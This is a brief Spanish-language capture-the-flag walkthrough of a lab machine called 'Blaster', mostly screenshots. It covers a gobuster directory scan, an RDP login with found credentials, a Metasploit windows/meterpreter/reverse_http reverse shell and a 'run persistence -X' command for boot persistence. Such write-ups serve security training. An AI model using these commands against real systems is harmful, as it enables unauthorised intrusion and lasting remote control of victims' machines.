# Blaster

## Nmap

![alt text](image.png)
![alt text](image-1.png)

## Fuzzing

    gobuster dir -u http://10.10.131.79/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php 

![alt text](image-4.png)

![alt text](image-2.png)

![alt text](image-3.png)

## MSRDP

Nos conectamos al Escritorio remoto

    xfreerdp /u:wade /p:parzival /v:10.10.131.79

![alt text](image-5.png)

En el historial podemos ver el CVE

En este video veremos el CVE en funcionamiento: https://www.youtube.com/watch?v=3BQKpPNlTSo

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

## Metasploit

![alt text](image-9.png)

![alt text](image-10.png)

Colocamos el LHOST

Colocamos el payload

    set payload windows/meterpreter/reverse_http

Ejecutamos la sesion como job

![alt text](image-11.png)

Copiamos el código en la consola de la máquina con acceso remoto, ya tendremos una shell meterpreter activa

Ejecutando el siguiente comando, conseguiremos persistencia en la máquina cuando el sistema se ejecuta

    run persistence -X